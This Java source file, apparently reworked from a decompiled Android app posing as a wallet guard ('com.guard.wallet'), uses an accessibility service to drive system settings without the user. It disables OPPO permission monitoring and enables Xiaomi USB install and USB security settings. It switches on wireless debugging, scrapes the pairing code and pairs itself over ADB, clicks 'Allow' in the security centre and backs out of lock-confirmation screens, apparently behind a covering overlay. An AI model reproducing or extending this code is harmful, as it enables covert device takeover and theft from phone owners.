/**
 * 配对流程调度任务 — PairAccessibilityDelegate 的 9 个 case 分发。
 *
 * vendor 原始类: o/y.java (570 行)
 * 处理: 开发者选项准备、无线调试配对、配对码对话框、配对失败对话框、安全中心导航。
 *
 * 字段:
 *   a — dispatch case id
 *   b — PairAccessibilityDelegate 引用
 */
package com.guard.wallet.delegate.task;

import com.guard.wallet.core.AppUtils;

import android.os.Build;
import android.util.Log;
import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.PairPortAndCodeResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Future;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;

public final class PairDelegateTask implements Runnable {
    public final int a;
    public final com.guard.wallet.delegate.PairAccessibilityDelegate b;

    public PairDelegateTask(com.guard.wallet.delegate.PairAccessibilityDelegate engine, int caseId) {
        this.a = caseId;
        this.b = engine;
    }

    @Override
    public final void run() {
        com.guard.wallet.delegate.ScreenCaptureManager.g pairSuccessState = com.guard.wallet.delegate.ScreenCaptureManager.g.d;
        int caseId = this.a;
        com.guard.wallet.delegate.PairAccessibilityDelegate engine = this.b;

        switch (caseId) {
            case 0:
                com.guard.wallet.delegate.PairAccessibilityDelegate.H(engine);
                return;

            case 1:
                com.guard.wallet.delegate.PairAccessibilityDelegate.H(engine);
                return;

            case 2:
                runCase2_PrepareFinish(engine);
                return;

            case 3:
                runCase3_PairSuccess(engine, pairSuccessState);
                return;

            case 4:
                runCase4_WifiDebugWindow(engine, pairSuccessState);
                return;

            case 5:
                runCase5_PairCodeDialog(engine, pairSuccessState);
                return;

            case 6:
                runCase6_PairFailDialog(engine);
                return;

            case 7:
                runCase7_BackFromLockScreen(engine);
                return;

            default:
                runCaseDefault_SecurityCenter(engine);
        }
    }

    /**
     * Case 2: pairInPrepareFinish — enable dev options checkboxes.
     * OPPO: find & check "禁用权限监控" checkbox.
     * Xiaomi: find & toggle "USB安装" and "USB安全设置" checkboxes.
     */
    private void runCase2_PrepareFinish(com.guard.wallet.delegate.PairAccessibilityDelegate engine) {
        try {
            if (!com.guard.wallet.delegate.PairAccessibilityDelegate.t0()) {
                engine.o.remove("pairInPrepareFinish");
                return;
            }

            engine.p.set(com.guard.wallet.delegate.ScreenCaptureManager.g.h);

            /* OPPO path: disable permission monitoring */
            if (com.guard.wallet.utils.DeviceUtils.isOppoFamily()) {
                AtomicInteger retryCounter = new AtomicInteger(0);
                while (!engine.s && retryCounter.incrementAndGet() <= 10) {
                    try {
                        UiObject scrollView = engine.f0();
                        if (scrollView != null && scrollView.canScrollForward()) {
                            scrollView.scrollForwardEnd();
                            engine.F(MyAccessibilityService.P().l0(false).getActiveFastRoot());
                            com.guard.wallet.utils.SystemHelper.T0(5);
                            scrollView = engine.f0();
                        }

                        UiObject target = null;
                        if (scrollView != null) {
                            if (scrollView.canScrollBackward()) {
                                target = scrollView.scrollBackwardUtil(com.guard.wallet.delegate.FilterHelper.createSingleScrollCondition(com.guard.wallet.delegate.PairAccessibilityDelegate.F0()));
                            }
                            if (target == null && scrollView.canScrollForward()) {
                                target = scrollView.scrollForwardUtil(com.guard.wallet.delegate.FilterHelper.createSingleScrollCondition(com.guard.wallet.delegate.PairAccessibilityDelegate.F0()));
                            }
                        }

                        if (target != null && target.parent() != null
                                && engine.g0(target.parent(), 20).isChecked()) {
                            engine.s = true;
                            Log.d("PairAccessibilityDelegate", "禁用权限监控已勾选");
                        }
                    } catch (Exception ex) {
                        AppUtils.s("PairAccessibilityDelegate", ex);
                    }

                    if (!engine.s) {
                        com.guard.wallet.utils.SystemHelper.T0(10);
                    }
                }

                com.guard.wallet.helper.BlockViewManager.h(80);
                engine.D0();
                engine.o.remove("pairInPrepareFinish");
                return;
            }

            /* Xiaomi path: USB安装 + USB安全设置 */
            if (com.guard.wallet.utils.DeviceUtils.isXiaomiFamily()) {
                /* Phase 1: USB安装 checkbox */
                AtomicInteger retryCounter = new AtomicInteger(0);
                while (!engine.t && retryCounter.incrementAndGet() <= 10) {
                    boolean clicked = false;
                    try {
                        UiObject scrollView = engine.f0();
                        UiObject usbInstallNode;

                        if (scrollView != null) {
                            Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                            usbInstallNode = com.guard.wallet.delegate.FilterHelper.scrollForwardUtil(scrollView, com.guard.wallet.delegate.PairAccessibilityDelegate.R0(), 2, 0);

                            if (usbInstallNode == null) {
                                scrollView.scrollBackwardEnd();
                                engine.F(MyAccessibilityService.P().l0(false).getActiveFastRoot());
                                com.guard.wallet.utils.SystemHelper.T0(5);
                                scrollView = engine.f0();
                                if (scrollView != null) {
                                    usbInstallNode = com.guard.wallet.delegate.FilterHelper.scrollForwardUtil(scrollView, com.guard.wallet.delegate.PairAccessibilityDelegate.R0(), 2, 0);
                                }
                            }
                        } else {
                            Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                            usbInstallNode = engine.k().findOneByOperateOr(com.guard.wallet.delegate.PairAccessibilityDelegate.R0());
                        }

                        if (usbInstallNode != null) {
                            Log.d("PairAccessibilityDelegate", "USB安装栏目查找成功");
                            UiObject clickableParent = usbInstallNode.findParentUtilCombine(com.guard.wallet.delegate.PairAccessibilityDelegate.q0());
                            if (clickableParent != null) {
                                Log.d("PairAccessibilityDelegate", "USB安装可点击栏目查找成功");
                                CheckedResult result = com.guard.wallet.delegate.PairAccessibilityDelegate.e0(clickableParent);
                                engine.t = result.isChecked();
                                clicked = result.isClicked();
                            } else {
                                Log.e("PairAccessibilityDelegate", "USB安装可点击栏目查找失败");
                            }
                        } else {
                            Log.e("PairAccessibilityDelegate", "USB安装栏目查找失败");
                        }
                    } catch (Exception ex) {
                        AppUtils.s("PairAccessibilityDelegate", ex);
                    }

                    if (clicked) {
                        Log.d("PairAccessibilityDelegate", "USB安装已点击");
                        com.guard.wallet.utils.SystemHelper.T0(10);
                    }
                    if (engine.t) {
                        Log.d("PairAccessibilityDelegate", "USB安装已勾选");
                    }
                    if (!engine.t) {
                        com.guard.wallet.utils.SystemHelper.T0(10);
                    }
                }

                com.guard.wallet.helper.BlockViewManager.h(70);
                retryCounter.set(0);

                /* Phase 2: USB安全设置 checkbox */
                while (true) {
                    boolean clicked = false;
                    try {
                        UiObject scrollView = engine.f0();
                        UiObject usbSecNode;

                        if (scrollView != null) {
                            Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                            usbSecNode = com.guard.wallet.delegate.FilterHelper.scrollForwardUtil(scrollView, com.guard.wallet.delegate.PairAccessibilityDelegate.S0(), 3, 0);

                            if (usbSecNode == null) {
                                scrollView.scrollBackwardEnd();
                                engine.F(MyAccessibilityService.P().l0(false).getActiveFastRoot());
                                com.guard.wallet.utils.SystemHelper.T0(5);
                                scrollView = engine.f0();
                                if (scrollView != null) {
                                    usbSecNode = com.guard.wallet.delegate.FilterHelper.scrollForwardUtil(scrollView, com.guard.wallet.delegate.PairAccessibilityDelegate.S0(), 3, 0);
                                }
                            }
                        } else {
                            Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                            usbSecNode = engine.k().findOneByOperateOr(com.guard.wallet.delegate.PairAccessibilityDelegate.S0());
                        }

                        if (usbSecNode != null) {
                            Log.d("PairAccessibilityDelegate", "USB安全设置栏目查找成功");
                            UiObject clickableParent = usbSecNode.findParentUtilCombine(com.guard.wallet.delegate.PairAccessibilityDelegate.q0());
                            if (clickableParent != null) {
                                Log.d("PairAccessibilityDelegate", "USB安全设置可点击栏目查找成功");
                                CheckedResult result = com.guard.wallet.delegate.PairAccessibilityDelegate.e0(clickableParent);
                                engine.u = result.isChecked();
                                clicked = result.isClicked();
                            } else {
                                Log.e("PairAccessibilityDelegate", "USB安全设置可点击栏目查找失败");
                            }
                        } else {
                            Log.e("PairAccessibilityDelegate", "USB安全设置栏目查找失败");
                        }
                    } catch (Exception ex) {
                        AppUtils.s("PairAccessibilityDelegate", ex);
                    }

                    if (engine.u) {
                        Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                    }
                    if (clicked) {
                        Log.d("PairAccessibilityDelegate", "USB安全设置点击成功");
                    }

                    /* Wait for O() (USB安全设置 dialog) with retries */
                    AtomicInteger pollCounter = new AtomicInteger(10);
                    boolean dialogFound = engine.O();
                    while (!dialogFound) {
                        try {
                            if (pollCounter.decrementAndGet() < 0) {
                                break;
                            }
                            com.guard.wallet.utils.SystemHelper.T0(1);
                            dialogFound = engine.O();
                        } catch (Exception ex) {
                            AppUtils.s("PairAccessibilityDelegate", ex);
                            break;
                        }
                    }

                    if (engine.u) {
                        break;
                    }
                    if (dialogFound) {
                        break;
                    }
                    if (retryCounter.incrementAndGet() > 10) {
                        break;
                    }
                    com.guard.wallet.utils.SystemHelper.T0(10);
                }

                com.guard.wallet.helper.BlockViewManager.h(80);
                if (engine.u) {
                    Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                    engine.D0();
                }
            }

            engine.o.remove("pairInPrepareFinish");
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
    }

    /**
     * Case 3: pairInPairSuccess — handle post-pair success navigation.
     * Press back to exit, handle Xiaomi API 35+ special case.
     */
    private void runCase3_PairSuccess(com.guard.wallet.delegate.PairAccessibilityDelegate engine, com.guard.wallet.delegate.ScreenCaptureManager.g pairSuccessState) {
        try {
            engine.o.remove("pairInPairSuccess");
            if (!com.guard.wallet.delegate.PairAccessibilityDelegate.t0()) {
                engine.D0();
                return;
            }

            /* Xiaomi API 35+ special handling */
            if (com.guard.wallet.utils.DeviceUtils.isXiaomiFamily() && Build.VERSION.SDK_INT >= 35) {
                if (AppUtils.b()) {
                    com.guard.wallet.utils.SystemHelper.T0(5);
                    if (!AppUtils.A()) {
                        AppUtils.O(null, null);
                    }
                }
            }

            if (com.guard.wallet.utils.SystemHelper.f1()) {
                return;
            }

            com.guard.wallet.utils.SystemHelper.F0(1);
            Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
            Thread.sleep(100L);
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
    }

    /**
     * Case 4: pairInWifiDebugWindow — enter wireless debug window and find pair button.
     * Finds "使用配对码配对" text, clicks its parent, enters pair code dialog.
     */
    private void runCase4_WifiDebugWindow(com.guard.wallet.delegate.PairAccessibilityDelegate engine, com.guard.wallet.delegate.ScreenCaptureManager.g pairSuccessState) {
        AtomicReference stateRef = engine.p;

        try {
            if (Objects.equals(stateRef.get(), pairSuccessState)) {
                return;
            }

            engine.G();
            Log.d("PairAccessibilityDelegate", "active root complete");
            stateRef.set(com.guard.wallet.delegate.ScreenCaptureManager.g.c);

            // ADAPT: 直接用 getWindows() 获取当前活跃窗口根节点搜索 Switch
            if (!com.guard.wallet.utils.SystemHelper.J()) {
                Log.e("PairAccessibilityDelegate", "case4: 无线调试未开启, 搜索 Switch");
                UiObject sw = null;
                try {
                    com.guard.wallet.service.MyAccessibilityService svc = com.guard.wallet.service.MyAccessibilityService.P();
                    if (svc != null) {
                        java.util.List<android.view.accessibility.AccessibilityWindowInfo> windows = svc.getWindows();
                        Log.e("PairAccessibilityDelegate", "case4: getWindows() 返回 " + (windows != null ? windows.size() : 0) + " 个窗口");
                        if (windows != null) {
                            for (android.view.accessibility.AccessibilityWindowInfo win : windows) {
                                if (win == null) continue;
                                android.view.accessibility.AccessibilityNodeInfo winRoot =
                                        android.os.Build.VERSION.SDK_INT >= 33
                                        ? com.guard.wallet.infra.WindowInfoCompat.getRootNode(win)
                                        : win.getRoot();
                                if (winRoot == null) continue;
                                UiObject winObj = new UiObject(winRoot, 0, 0);
                                sw = winObj.findOneByCombine(com.guard.wallet.delegate.PairAccessibilityDelegate.Q0());
                                if (sw != null) {
                                    Log.e("PairAccessibilityDelegate", "case4: 在窗口 '" + win.getTitle() + "' 找到 Switch, checked=" + sw.checked());
                                    engine.F(winObj);
                                    engine.i.set(true);
                                    break;
                                } else {
                                    // dump 窗口内所有 checkable 和 clickable 节点
                                    Log.e("PairAccessibilityDelegate", "case4: 窗口 '" + win.getTitle() + "' 无 Switch, dump checkable/clickable 节点:");
                                    java.util.ArrayDeque<UiObject> dumpStack = new java.util.ArrayDeque<>();
                                    dumpStack.push(winObj);
                                    int dumpCount = 0;
                                    while (!dumpStack.isEmpty() && dumpCount < 50) {
                                        UiObject n = dumpStack.pop();
                                        if (n.checkable() || "android.widget.Switch".equals(n.className()) || "android.widget.ToggleButton".equals(n.className()) || "android.widget.CompoundButton".equals(n.className())) {
                                            Log.e("PairAccessibilityDelegate", "  → class=" + n.className() + " text=" + n.text() + " checkable=" + n.checkable() + " checked=" + n.checked());
                                            dumpCount++;
                                        }
                                        for (int ci = 0; ci < n.childCount(); ci++) {
                                            UiObject ch = n.child(ci);
                                            if (ch != null) dumpStack.push(ch);
                                        }
                                    }
                                }
                            }
                        }
                    }
                } catch (Exception ex) {
                    Log.e("PairAccessibilityDelegate", "case4: getWindows 搜索 Switch 异常", ex);
                }
                if (sw != null && !sw.checked()) {
                    sw.click();
                    Log.e("PairAccessibilityDelegate", "case4: Switch 已点击开启");
                    com.guard.wallet.utils.SystemHelper.T0(15);
                } else if (sw == null) {
                    Log.e("PairAccessibilityDelegate", "case4: 所有窗口均未找到 Switch");
                }
            } else {
                Log.e("PairAccessibilityDelegate", "case4: 无线调试已开启");
            }

            /* Find "使用配对码配对" text with retry + timeout */
            CombineFilter pairFilter = com.guard.wallet.delegate.PairAccessibilityDelegate.u0();
            Log.e("PairAccessibilityDelegate", "case4: pairFilter=" + (pairFilter != null ? "OK" : "NULL"));
            UiObject pairNode = null;
            int retryCount = 0;
            final int MAX_RETRIES = 20;

            try {
                while (pairNode == null && retryCount < MAX_RETRIES) {
                    retryCount++;
                    if (engine.k() == null || pairFilter == null) {
                        Log.e("PairAccessibilityDelegate", "case4: k() or pairFilter is null, break");
                        break;
                    }
                    engine.k().refresh();
                    pairNode = engine.k().findOneByCombine(pairFilter);
                    if (pairNode == null) {
                        Log.e("PairAccessibilityDelegate", "case4: retry " + retryCount + "/" + MAX_RETRIES + " 使用配对码配对未找到");
                    }
                    com.guard.wallet.utils.SystemHelper.T0(5);
                }

                if (pairNode != null) {
                    Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                }
            } catch (Exception ex) {
                AppUtils.s("PairAccessibilityDelegate", ex);
            }

            if (pairNode != null) {
                Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                com.guard.wallet.helper.BlockViewManager.h(30);
                UiObject clickableParent = pairNode.findParentUtilCombine(com.guard.wallet.delegate.PairAccessibilityDelegate.T());
                if (clickableParent != null && clickableParent.click()) {
                    Log.d("PairAccessibilityDelegate", "使用配对码配对栏目已点击");
                    // ADAPT: 更新状态为 PAIR_CODE，让 u() 不再被 LEAVE_DEV_OPT 拦截
                    // 这样 M()（配对码对话框检测）可以被执行
                    stateRef.set(com.guard.wallet.delegate.EngineHelper.PAIR_DEPT_PAIR_CODE);
                    com.guard.wallet.helper.BlockViewManager.h(35);
                    return;
                }
                Log.e("PairAccessibilityDelegate", "使用配对码配对栏目点击失败");
            } else {
                Log.e("PairAccessibilityDelegate", "使用配对码配对栏目查找失败");
            }
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
    }

    /**
     * Case 5: pairInPairCodeDialog — read pair code and initiate ADB pairing.
     * Uses ReadPairCodeCallable to extract code/port from UI,
     * then calls h.e.K() to pair.
     */
    private void runCase5_PairCodeDialog(com.guard.wallet.delegate.PairAccessibilityDelegate engine, com.guard.wallet.delegate.ScreenCaptureManager.g pairSuccessState) {
        AtomicReference stateRef = engine.p;
        String delegateId = engine.c;

        try {
            boolean inDialog = engine.M();

            if (inDialog) {
                if (engine.Q() || Objects.equals(stateRef.get(), pairSuccessState)) {
                    /* Already paired or in progress */
                } else {
                    // ADAPT: 移除 PAIR_CODE 状态跳过逻辑
                    // Case 4 点击"使用配对码配对"后设置 PAIR_CODE，此处应继续执行 callable
                    Log.d("PairAccessibilityDelegate", "pairInPairCodeDialog 窗口匹配");
                    engine.G();
                    Log.d("PairAccessibilityDelegate", "active root complete");
                    stateRef.set(com.guard.wallet.delegate.ScreenCaptureManager.g.f);

                    com.guard.wallet.thread.ReadPairCodeCallable callable = new com.guard.wallet.thread.ReadPairCodeCallable(engine);
                    Future future = com.guard.wallet.thread.DelegateTaskLauncher.b(callable, delegateId);

                    if (future != null) {
                        /* Wait for pair code reading to complete */
                        while (!future.isDone()) {
                            Log.d("PairAccessibilityDelegate", "正在读取配对码和配对端口");
                            com.guard.wallet.utils.SystemHelper.T0(2);
                        }

                        try {
                            PairPortAndCodeResult result = (PairPortAndCodeResult) future.get();
                            if (result != null) {
                                Log.d("PairAccessibilityDelegate", "读取配对码和配对端口完成");
                                com.guard.wallet.helper.BlockViewManager.h(40);

                                // ADAPT: o.h class shadows package h; use EngineHelper for h.e access
                                if (com.guard.wallet.delegate.EngineHelper.heS() != null) {
                                    Log.d("PairAccessibilityDelegate", "正在发起配对");
                                    com.guard.wallet.delegate.EngineHelper.heS().bootstrapCompleted.set(false);
                                    com.guard.wallet.delegate.EngineHelper.heS().pairDevice(result.getHost(), result.getPairPort(), result.getPairCode());

                                    if (com.guard.wallet.delegate.EngineHelper.heS().isPaired()) {
                                        Log.d("PairAccessibilityDelegate", "本次配对成功");
                                        com.guard.wallet.helper.BlockViewManager.h(45);
                                        stateRef.set(pairSuccessState);
                                    } else {
                                        Log.d("PairAccessibilityDelegate", "本次配对失败");
                                    }
                                }
                            } else {
                                Log.e("PairAccessibilityDelegate", "读取配对码和配对端口失败");
                            }
                        } catch (Exception ex) {
                            AppUtils.s("PairAccessibilityDelegate", ex);
                        }
                    }
                }
            }

            /* Update state if not paired */
            if (!Objects.equals(stateRef.get(), pairSuccessState)) {
                stateRef.set(com.guard.wallet.delegate.ScreenCaptureManager.g.g);
            }

            /* If still in dialog after pairing attempt, handle result */
            if (!engine.M()) {
                return;
            }
            Log.e("PairAccessibilityDelegate", "配对结束,仍然停留在配对码窗口");
            boolean pairSuccess = Objects.equals(stateRef.get(), pairSuccessState);
            com.guard.wallet.thread.PairResultHandler resultHandler = new com.guard.wallet.thread.PairResultHandler(pairSuccess, engine);
            com.guard.wallet.thread.DelegateTaskLauncher.b((Runnable) resultHandler, delegateId);
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
    }

    /**
     * Case 6: pairInPairFailDialog — dismiss pair fail dialog by clicking OK.
     * Retries while N() (fail dialog) is present.
     */
    private void runCase6_PairFailDialog(com.guard.wallet.delegate.PairAccessibilityDelegate engine) {
        try {
            while (true) {
                if (engine.N()) {
                    UiObject okButton = engine.k().findOneByCombine(com.guard.wallet.delegate.PairAccessibilityDelegate.V());
                    if (okButton != null && okButton.click()) {
                        Log.d("PairAccessibilityDelegate", "配对失败对话框确定按钮查找并点击完成");
                        com.guard.wallet.utils.SystemHelper.T0(10);
                    }
                } else {
                    ConcurrentLinkedQueue queue = engine.o;
                    queue.remove("pairInWifiDebugWindow");
                    queue.remove("pairInPairCodeDialog");
                    queue.remove("pairInPairFailDialog");
                    return;
                }
            }
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
    }

    /**
     * Case 7: backFromLockScreen — press back while still in confirm lock window.
     * Repeatedly presses back + waits until no longer in lock screen.
     */
    private void runCase7_BackFromLockScreen(com.guard.wallet.delegate.PairAccessibilityDelegate engine) {
        try {
            while (true) {
                boolean inLock = engine.q(com.guard.wallet.delegate.EngineHelper.confirmLockWindows());
                if (!inLock) {
                    break;
                }
                try {
                    com.guard.wallet.utils.SystemHelper.F0(1);
                    Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
                    Thread.sleep(100L);
                } catch (Exception ex) {
                    AppUtils.s("PairAccessibilityDelegate", ex);
                }
                com.guard.wallet.utils.SystemHelper.T0(5);
            }
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
    }

    /**
     * Default case: pairInSecurityCenter — handle Xiaomi security center UI.
     * Clicks "下一步" or "允许" button, waits for USB安全设置 dialog to dismiss.
     */
    private void runCaseDefault_SecurityCenter(com.guard.wallet.delegate.PairAccessibilityDelegate engine) {
        try {
            Log.d("PairAccessibilityDelegate", "pairInSecurityCenter 窗口匹配");

            /* Try "下一步" (next step) button */
            UiObject nextButton = engine.k().findOneByCombine(com.guard.wallet.delegate.PairAccessibilityDelegate.K0());
            if (nextButton != null && nextButton.clickable() && nextButton.click()) {
                Log.d("PairAccessibilityDelegate", "USB安装设置窗口下一步按钮查找并点击完成");
                engine.o.remove("pairInSecurityCenter");
                return;
            }

            /* Try "允许" (allow) button */
            UiObject allowButton = engine.k().findOneByCombine(com.guard.wallet.delegate.PairAccessibilityDelegate.J0());
            if (allowButton == null) {
                return;
            }

            Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮查找完成");
            if (!allowButton.clickable()) {
                return;
            }
            Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮已可以点击");
            if (!allowButton.click()) {
                return;
            }
            Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮点击完成");
            com.guard.wallet.utils.SystemHelper.T0(10);

            /* Wait for USB安全设置 dialog to dismiss */
            while (true) {
                boolean inDialog = false;
                try {
                    if (engine.k() != null && engine.k().findOneByCombine(com.guard.wallet.delegate.PairAccessibilityDelegate.L0()) != null) {
                        Log.d("PairAccessibilityDelegate", "当前处于USB安全设置对话框");
                        inDialog = true;
                    }
                } catch (Exception ex) {
                    AppUtils.s("PairAccessibilityDelegate", ex);
                }

                if (!inDialog) {
                    engine.u = true;
                    engine.D0();
                    return;
                }
                Log.d("PairAccessibilityDelegate", "正在开启USB安全设置....");
                com.guard.wallet.utils.SystemHelper.T0(5);
            }
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
    }
}
